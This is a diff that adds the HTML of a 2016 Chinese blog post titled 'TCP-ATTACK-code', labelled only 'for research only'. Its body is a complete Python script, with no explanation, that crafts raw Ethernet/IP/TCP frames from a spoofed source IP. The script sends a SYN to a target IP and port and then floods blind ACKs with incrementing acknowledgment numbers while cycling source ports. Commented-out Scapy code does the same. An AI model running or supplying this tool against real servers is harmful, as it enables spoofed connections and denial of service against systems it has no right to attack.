@@ -1,0 +1,684 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+  <link href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"/>
+
+
+
+
+  <link href="//fonts.googleapis.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+
+
+
+<link href="/vendors/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=0.5.0" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="tcp,attack,code," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/tri.ico?v=0.5.0" />
+
+
+
+
+
+
+<meta name="description" content="仅用于研究！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TCP-ATTACK-code">
+<meta property="og:url" content="http://www.ariesin.com/2016/03/24/TCP-ATTACK-code/index.html">
+<meta property="og:site_name" content="Ariesin">
+<meta property="og:description" content="仅用于研究！">
+<meta property="og:updated_time" content="2016-03-24T07:08:35.063Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="TCP-ATTACK-code">
+<meta name="twitter:description" content="仅用于研究！">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 0,
+      author: '博主'
+    }
+  };
+</script>
+
+  <title> TCP-ATTACK-code | Ariesin </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/"  class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">Ariesin</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-home fa-fw"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-th fa-fw"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-archive fa-fw"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                TCP-ATTACK-code
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-03-24T15:07:34+08:00" content="2016-03-24">
+              2016-03-24
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>仅用于研究！<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line">import sys, time, struct, socket, array</span><br><span class="line"></span><br><span class="line">if len(sys.argv) != 6:</span><br><span class="line">    print(&quot;Usage: ./tcspoof iface srcMAC gatewayMAC srcIP:sport-range dstIP:dport&quot;)</span><br><span class="line">    print(&quot;E.g. ./tcspoof eth0 aa:bb:dd:99:88:77 aa:bb:cc:00:11:22 1.2.3.4:1024-65535 80.100.131.150:80&quot;) # &apos;DELETE / HTTP/1.0\\n\\n&apos;&quot;)</span><br><span class="line">    print(&quot;The source port range is inclusive.&quot;)</span><br><span class="line">    print(&quot;NOTE: appending payload currently not supported for a couple reasons.&quot;)</span><br><span class="line">    sys.exit(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Parse parameters</span><br><span class="line"></span><br><span class="line">dev = sys.argv[1]</span><br><span class="line"></span><br><span class="line">ourMAC = sys.argv[2]</span><br><span class="line"></span><br><span class="line">dstMAC = sys.argv[3]</span><br><span class="line"></span><br><span class="line">srcIP, srcPort = sys.argv[4].split(&apos;:&apos;)</span><br><span class="line">srcPort = srcPort.split(&apos;-&apos;)</span><br><span class="line">srcPort[0] = int(srcPort[0])</span><br><span class="line">srcPort[1] = int(srcPort[1])</span><br><span class="line"></span><br><span class="line">dstIP, dstPort = sys.argv[5].split(&apos;:&apos;)</span><br><span class="line">dstPort = int(dstPort)</span><br><span class="line"></span><br><span class="line"># Convert hexadecimal (aa:bb:cc) to binary (\xaa\xbb\xcc)</span><br><span class="line">mac = &apos;&apos;</span><br><span class="line">for macpart in dstMAC.split(&quot;:&quot;):</span><br><span class="line">    mac += chr(int(macpart, 16))</span><br><span class="line">dstMAC = mac</span><br><span class="line"></span><br><span class="line">mac = &apos;&apos;</span><br><span class="line">for macpart in ourMAC.split(&quot;:&quot;):</span><br><span class="line">    mac += chr(int(macpart, 16))</span><br><span class="line">ourMAC = mac</span><br><span class="line"></span><br><span class="line">### End of parameter parsing</span><br><span class="line"></span><br><span class="line"># Precompute some fields that we are going to use a lot</span><br><span class="line">srcIP2 = socket.inet_aton(srcIP) # 32 bits</span><br><span class="line">dstIP2 = socket.inet_aton(dstIP) # 32 bits</span><br><span class="line">struc20 = struct.pack(&quot;!H&quot;, 20)</span><br><span class="line">winsize = struct.pack(&quot;!H&quot;, 0xeffe)</span><br><span class="line"></span><br><span class="line"># Checksumming is taken from Scapy.</span><br><span class="line">if struct.pack(&quot;H&quot;,1) == &quot;\x00\x01&quot;: # big endian</span><br><span class="line">    def checksum(pkt):</span><br><span class="line">        if len(pkt) % 2 == 1:</span><br><span class="line">            pkt += &quot;\0&quot;</span><br><span class="line">        s = sum(array.array(&quot;H&quot;, pkt))</span><br><span class="line">        s = (s &gt;&gt; 16) + (s &amp; 0xffff)</span><br><span class="line">        s += s &gt;&gt; 16</span><br><span class="line">        s = ~s</span><br><span class="line">        return s &amp; 0xffff</span><br><span class="line">else:</span><br><span class="line">    def checksum(pkt):</span><br><span class="line">        if len(pkt) % 2 == 1:</span><br><span class="line">            pkt += &quot;\0&quot;</span><br><span class="line">        s = sum(array.array(&quot;H&quot;, pkt))</span><br><span class="line">        s = (s &gt;&gt; 16) + (s &amp; 0xffff)</span><br><span class="line">        s += s &gt;&gt; 16</span><br><span class="line">        s = ~s</span><br><span class="line">        return (((s&gt;&gt;8)&amp;0xff)|s&lt;&lt;8) &amp; 0xffff</span><br><span class="line"></span><br><span class="line">def build_ip_header(datalength, srcIP, dstIP):</span><br><span class="line">    version = 4 # 4 bits</span><br><span class="line">    headerlen = 5 # 5*32bits = 20 bytes # 4 bits</span><br><span class="line">    dscp = 0 # 6 bits</span><br><span class="line">    ecn = 0 # disable capability # 2 bits</span><br><span class="line">    totalLength = datalength + 20 # 16 bits</span><br><span class="line">    identification = 22641 # random # 16 bits</span><br><span class="line">    flags = 0 # 3 bits</span><br><span class="line">    fragmentOffset = 0 # 13 bits</span><br><span class="line">    ttl = 64 # 8 bits</span><br><span class="line">    proto = 6 # 8 bits</span><br><span class="line">    chksum = 0 # initial value # 16 bits</span><br><span class="line">    srcIP = socket.inet_aton(srcIP) # 32 bits</span><br><span class="line">    dstIP = socket.inet_aton(dstIP) # 32 bits</span><br><span class="line"></span><br><span class="line">    # Convert fields to binary</span><br><span class="line">    version_headerlen = chr(((version &amp; 0xf) &lt;&lt; 4) | headerlen &amp; 0x0f)</span><br><span class="line">    dscp_ecn = &quot;\0&quot;</span><br><span class="line">    totalLen = struct.pack(&quot;!H&quot;, totalLength)</span><br><span class="line">    ident = &quot;xD&quot;</span><br><span class="line">    flags_fragmentOffset = &quot;\0\0&quot;</span><br><span class="line">    ttl = chr(64)</span><br><span class="line">    proto = chr(6)</span><br><span class="line">    chksum = &quot;\0\0&quot;</span><br><span class="line"></span><br><span class="line">    without_checksum = version_headerlen + dscp_ecn + totalLen + ident + flags_fragmentOffset + ttl + proto + chksum + srcIP + dstIP</span><br><span class="line">    chksum = checksum(without_checksum)</span><br><span class="line">    if chksum == 0:</span><br><span class="line">        chksum = 0xffff</span><br><span class="line">    return without_checksum[:10] + chr(chksum &gt;&gt; 8) + chr(chksum &amp; 0xff) + without_checksum[12:]</span><br><span class="line"></span><br><span class="line"># Create a static IP header, 60% performance increase over computing it every time</span><br><span class="line">ip_header = build_ip_header(20, srcIP, dstIP)</span><br><span class="line"></span><br><span class="line">def build_tcp_header(sport, seqno, ackno, syn):</span><br><span class="line">    dataOffset = chr(0b01010000) # header length (5) + 3 bits waste (000) + NS flag (0)</span><br><span class="line">    if syn == True:</span><br><span class="line">        flags = chr(0b00000010) # syn flag set, all other flags NOT set</span><br><span class="line">    else:</span><br><span class="line">        flags = chr(0b00010000) # ack flag set, all other flags NOT set</span><br><span class="line"></span><br><span class="line">    without_checksum = struct.pack(&quot;!HHLL&quot;, sport, dstPort, seqno, ackno) + dataOffset + flags + winsize + &quot;\0\0\0\0&quot;</span><br><span class="line">    # This pseudo-header has to be used in checksum computation (see TCP RFC)</span><br><span class="line">    pseudoHeader = srcIP2 + dstIP2 + &apos;\0&apos; + chr(6) + struc20</span><br><span class="line">    chksum = checksum(pseudoHeader + without_checksum)</span><br><span class="line">    if chksum == 0:</span><br><span class="line">        chksum = 0xffff</span><br><span class="line">    return without_checksum[:16] + struct.pack(&quot;!H&quot;, chksum) + without_checksum[18:]</span><br><span class="line"></span><br><span class="line">def build_syn(ourMAC, dstMAC, srcIP, srcPort, dstIP, dstPort):</span><br><span class="line">    eth_header = dstMAC + ourMAC + &quot;\x08\x00&quot; # type=IP</span><br><span class="line">    tcp_header = build_tcp_header(srcPort, 42, 0, True)</span><br><span class="line">    ip_header = build_ip_header(len(tcp_header), srcIP, dstIP)</span><br><span class="line">    return eth_header + ip_header + tcp_header</span><br><span class="line"></span><br><span class="line">def build_ack(srcPort, ackno):</span><br><span class="line">    eth_header = dstMAC + ourMAC + &quot;\x08\x00&quot; # type=IP</span><br><span class="line">    tcp_header = build_tcp_header(srcPort, 43, ackno, False)</span><br><span class="line">    return eth_header + ip_header + tcp_header</span><br><span class="line"></span><br><span class="line"># Create a socket to send raw ethernet frames over</span><br><span class="line">sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)</span><br><span class="line"></span><br><span class="line">bind = (dev, 0)</span><br><span class="line">starttime = 0</span><br><span class="line">sport = srcPort[0] - 1</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        # Every 18 seconds (to compensate for latency), send a new SYN packet and start over</span><br><span class="line">        if time.time() - starttime &gt; 18:</span><br><span class="line">            sys.stdout.write(&apos;.&apos;)</span><br><span class="line">            # Since we write to stdout/stderr manually, we also need to flush manually...</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line">            sys.stderr.flush()</span><br><span class="line">            sport += 1</span><br><span class="line">            if sport &gt; srcPort[1]:</span><br><span class="line">                sport = srcPort[0]</span><br><span class="line">            try:</span><br><span class="line">                sock.sendto(build_syn(ourMAC, dstMAC, srcIP, sport, dstIP, dstPort), bind)</span><br><span class="line">            except socket.error:</span><br><span class="line">                sys.stderr.write(&apos;!&apos;)</span><br><span class="line">            ackno = 1</span><br><span class="line">            starttime = time.time()</span><br><span class="line">            # Wait 100ms to make sure our ACK doesn&apos;t arrive before the server sent the SYN+ACK</span><br><span class="line">            time.sleep(0.1)</span><br><span class="line">        try:</span><br><span class="line">            sock.sendto(build_ack(sport, ackno), bind)</span><br><span class="line">        except socket.error: # This happened a lot when sending on 8 cores when the transmit buffer was full (virtual NICs are slow...)</span><br><span class="line">            sys.stderr.write(&apos;!&apos;)</span><br><span class="line">        ackno += 1</span><br><span class="line">except KeyboardInterrupt:</span><br><span class="line">    print(&quot;Caught keyboard interrupt.&quot;)</span><br><span class="line"></span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">Old code from Scapy, but scapy is way too slow to use here (hence the above own implementation...)</span><br><span class="line"></span><br><span class="line">syn = ip / TCP(sport = port, dport = 80, flags = &apos;S&apos;, seq = 42)</span><br><span class="line">synack = sr1(syn)</span><br><span class="line">starttime = time.time()</span><br><span class="line">while True:</span><br><span class="line">	sendp(eth / ip / TCP(sport = synack.dport, dport = 80, flags = &quot;A&quot;, seq = synack.ack, ack = RandNum(1, 65535)), iface = &apos;eth0&apos;)</span><br><span class="line">	if time.time() - starttime &gt; 22:</span><br><span class="line">		break</span><br><span class="line"></span><br><span class="line">send(ip / TCP(sport = synack.dport, dport = 80, flags = &quot;A&quot;, seq = synack.ack, ack = synack.seq + 1))</span><br><span class="line">data = ip / TCP(sport = synack.dport, dport = 80, flags = &quot;A&quot;, seq = synack.ack, ack = synack.seq + 1) / &apos;GET / HTTP/1.0\r\nHost: lgms.nl\r\n\r\n&apos;</span><br><span class="line">print(sr1(data))</span><br><span class="line">&apos;&apos;&apos;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/tcp/" rel="tag">#tcp</a>
+          
+            <a href="/tags/attack/" rel="tag">#attack</a>
+          
+            <a href="/tags/code/" rel="tag">#code</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/03/24/SQLMap-tamper-绕过WAF-code/" rel="next" title="SQLMap-tamper-绕过WAF-code">
+                <i class="fa fa-chevron-left"></i> SQLMap-tamper-绕过WAF-code
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/default_avatar.jpg"
+               alt="MengNan Li" />
+          <p class="site-author-name" itemprop="name">MengNan Li</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+            <div class="site-state-item site-state-categories">
+              <a href="/categories">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        <div class="links-of-blogroll motion-element">
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
+          <div class="post-toc">
+            
+              
+            
+            
+              <p class="post-toc-empty">此文章未包含目录</p>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">MengNan Li</span>
+</div>
+
+
+
+
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+
+
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=0.5.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=0.5.0"></script>
+
+
+
+  
+  
+
+  
+  
+<script type="text/javascript" src="/js/src/scrollspy.js?v=0.5.0"></script>
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 1 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = NexT.utils.escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    NexT.motion.middleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+
+      if (CONFIG.sidebar.display === 'post' || CONFIG.sidebar.display === 'always') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          NexT.utils.displaySidebar();
+        }
+      }
+    };
+  });
+</script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=0.5.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+  
+  
+  
+
+  
+
+
+</body>
+</html>
